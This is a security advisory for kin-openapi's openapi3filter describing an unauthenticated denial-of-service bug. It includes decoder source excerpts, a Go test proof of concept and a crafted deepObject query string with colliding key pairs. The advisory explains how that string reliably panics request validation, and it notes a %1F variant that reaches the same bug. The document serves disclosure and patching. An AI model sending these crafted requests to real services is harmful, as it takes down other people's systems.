### Summary

An unauthenticated attacker can crash any service that validates incoming
requests with `openapi3filter` by sending a single crafted `GET` request. A
query parameter using the `deepObject` style triggers an unchecked type
assertion in the object decoder, causing a Go `panic` ("interface conversion:
interface {} is string, not map[string]interface {}"). Because the panic occurs
during request validation — before authentication is enforced — this is a
remotely reachable, pre-auth denial of service.

### Details

`deepObject` query parameters encode nested object structures with bracketed
keys, e.g. `filter[a]=1` (scalar property `a`) and `filter[a][b]=1` (nested
property `a.b`). The decoder collects these into a flat `props` map and rebuilds
the nested object in `makeObject`, which calls `deepSet` once per property.

In `openapi3filter/req_resp_decoder.go`:

```go
func deepSet(m map[string]any, keys []string, value any) {
	for i := 0; i < len(keys)-1; i++ {
		key := keys[i]
		if _, ok := m[key]; !ok {
			m[key] = make(map[string]any)
		}
		m = m[key].(map[string]any) // line 929 — unchecked type assertion
	}
	m[keys[len(keys)-1]] = value
}
```

`deepSet` walks the key path and, at line 929, asserts that each intermediate
node is a `map[string]any`. It never uses the comma-ok form, so the assertion
panics if the node is anything else.

`makeObject` drives this per decoded property:

```go
func makeObject(props map[string]string, schema *openapi3.SchemaRef) (map[string]any, error) {
	mobj := make(map[string]any)

	for kk, value := range props {
		keys := strings.Split(kk, urlDecoderDelimiter)
		// ...
		deepSet(mobj, keys, value) // line 945
	}
	// ...
}
```

When a scalar key and a nested key collide on a prefix, the bug fires. Consider
the properties `a` (from `filter[a]=1`) and `a.b` (from `filter[a][b]=1`):

- If `a` is processed first, `mobj["a"]` is set to the string `"1"`. Then
  processing `a.b` enters the loop, sees `mobj["a"]` already exists (so the
  guard at line 926 does not create a map), and executes
  `m = mobj["a"].(map[string]any)` — asserting a `string` to `map[string]any`,
  which panics.
- If `a.b` is processed first, `mobj["a"]` becomes a map and no panic occurs on
  that pair.

The order in which `props` entries are visited is Go's map iteration order,
which is randomized per run. A single conflicting pair therefore panics only
about half the time. This is trivially defeated: supplying several independent
conflicting pairs — `filter[a]`/`filter[a][b]`, `filter[c]`/`filter[c][d]`,
`filter[e]`/`filter[e][f]` — makes the request panic unless *every* pair happens
to be visited nested-first, whose probability shrinks geometrically with the
number of pairs. Three pairs already panic on essentially every request, making
the DoS deterministic in practice.

Taint path (all reachable from a normal, unauthenticated request):

```
ValidateRequest
  -> ValidateParameter
    -> decodeStyledParameter
      -> decodeValue (object)
        -> urlValuesDecoder.DecodeObject           (deepObject branch, ~line 722)
          -> makeObject                             (req_resp_decoder.go:945)
            -> deepSet                              (req_resp_decoder.go:929) -> panic
```

The same code path is reachable for the `form` object style: the decoder splits
composite keys on an internal delimiter (the `0x1F` unit-separator byte). An
attacker who injects that byte into query keys via `%1F` reaches `makeObject`
and the identical unchecked assertion.

Any application that calls `openapi3filter.ValidateRequest` (directly or through
middleware) on a spec containing an object-typed query parameter with
`style: deepObject` is affected. Validation runs ahead of the application's own
authentication, so no credentials are required to reach the panic. While
`net/http`'s per-connection `recover` prevents a single request from taking down
the whole process, each malicious request still aborts the handler goroutine and
the request it was serving; frameworks or custom servers that do not recover
around the validation call crash outright.

### PoC

Add the following test as `openapi3filter/advisory_poc_test.go` and run it
against the affected library. It builds a minimal spec with a single
`deepObject` query parameter, routes a crafted request, and validates it. On
vulnerable code the validation panics and the test fails with the recovered
panic message.

```go
package openapi3filter_test

import (
	"context"
	"net/http"
	"testing"

	"github.com/getkin/kin-openapi/openapi3"
	"github.com/getkin/kin-openapi/openapi3filter"
	"github.com/getkin/kin-openapi/routers/gorillamux"
)

const specDeepObjectConflict = `
openapi: 3.1.0
info: {title: PoC, version: 1.0.0}
paths:
  /test:
    get:
      parameters:
        - name: filter
          in: query
          style: deepObject
          explode: true
          schema:
            type: object
            additionalProperties: true
      responses:
        '200': {description: ok}
`

// TestPoCDeepObjectKeyCollisionPanic fails on vulnerable code: a single
// unauthenticated GET request panics via an unchecked type assertion.
// Multiple conflicting scalar/nested key pairs defeat Go's randomized map
// order so the panic is essentially deterministic.
func TestPoCDeepObjectKeyCollisionPanic(t *testing.T) {
	loader := openapi3.NewLoader()
	doc, err := loader.LoadFromData([]byte(specDeepObjectConflict))
	if err != nil {
		t.Fatalf("load: %v", err)
	}
	if err := doc.Validate(loader.Context); err != nil {
		t.Fatalf("validate: %v", err)
	}
	router, err := gorillamux.NewRouter(doc)
	if err != nil {
		t.Fatalf("router: %v", err)
	}

	const target = "/test?filter[a]=1&filter[a][b]=1&filter[c]=1&filter[c][d]=1&filter[e]=1&filter[e][f]=1"
	req, _ := http.NewRequest(http.MethodGet, target, nil)
	route, pathParams, err := router.FindRoute(req)
	if err != nil {
		t.Fatalf("route: %v", err)
	}

	defer func() {
		if r := recover(); r != nil {
			t.Fatalf("VULNERABLE: request handling panicked: %v", r)
		}
	}()
	_ = openapi3filter.ValidateRequest(context.Background(), &openapi3filter.RequestValidationInput{
		Request: req, PathParams: pathParams, Route: route,
		Options: &openapi3filter.Options{AuthenticationFunc: openapi3filter.NoopAuthenticationFunc},
	})
	t.Log("no panic this run: re-run; code appears patched if consistently green")
}
```

Command:

```
go test ./openapi3filter/ -run TestPoCDeepObjectKeyCollisionPanic -v -count=1
```

Observed output on affected code (`v0.145.0`, base commit
`88aa64c7cbd03ecadbb419c473bdcaa8b0124c6b`):

```
=== RUN   TestPoCDeepObjectKeyCollisionPanic
    advisory_poc_test.go:58: VULNERABLE: request handling panicked: interface conversion: interface {} is string, not map[string]interface {}
--- FAIL: TestPoCDeepObjectKeyCollisionPanic (0.00s)
FAIL
FAIL	github.com/getkin/kin-openapi/openapi3filter	0.011s
FAIL
```

The PoC uses three conflicting key pairs so the outcome is deterministic: the
test failed with the panic on every run (repeated three times, all identical).
With a single conflicting pair the panic would appear on roughly half of runs
because of randomized Go map iteration order, as explained above; the multi-pair
construction removes that variance.

### Impact

Unauthenticated remote denial of service (CWE-704 unchecked type assertion). Any
attacker who can send an HTTP request to an endpoint validated by
`openapi3filter`, where the operation declares an object query parameter with
`style: deepObject`, can reliably panic the request-handling goroutine with a
single crafted `GET`. No authentication, request body, or special privileges are
required. On servers that do not recover around the validation call this crashes
the process; even with `net/http`'s built-in per-request recovery, each request
still aborts and an attacker can sustain the condition to degrade availability.

---

- Ecosystem: Go
- Package: github.com/getkin/kin-openapi
- Affected versions: all released versions up to and including v0.145.0 (present since deepObject object decoding via `deepSet` was introduced).
- CVSS v3.1: 7.5 (High) — AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
- CWE: CWE-704 (Incorrect Type Conversion or Cast); also CWE-755 (Improper Handling of Exceptional Conditions), CWE-20 (Improper Input Validation).
- Advisory relationship: Novel. No published advisory describes this type-assertion panic. It resides in the deepObject decoder subsystem but is a distinct bug class from the known deepObject resource-consumption issue.
